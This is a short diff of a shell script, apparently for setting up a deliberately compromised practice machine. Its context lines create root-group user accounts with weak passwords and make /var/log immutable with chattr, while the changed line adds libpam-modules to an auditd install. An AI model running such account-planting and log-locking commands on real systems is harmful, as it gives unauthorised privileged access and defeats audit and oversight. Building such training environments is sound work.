@@ -5,7 +5,7 @@ useradd impasta2 -g 0 -p admin -s /bin/sh
 useradd iaminsideyourwalls -g 1 -p admin -s /bin/csh
 useradd l33th4x0r -g 0 -p hax -s /bin/sh
 #Install auditd before we break stuff
-apt install -y auditd
+apt install -y auditd libpam-modules
 #Make /var/log and /etc/passwd readonly :)
 chattr -R +i /var/log
 chattr -i /var/log/audit
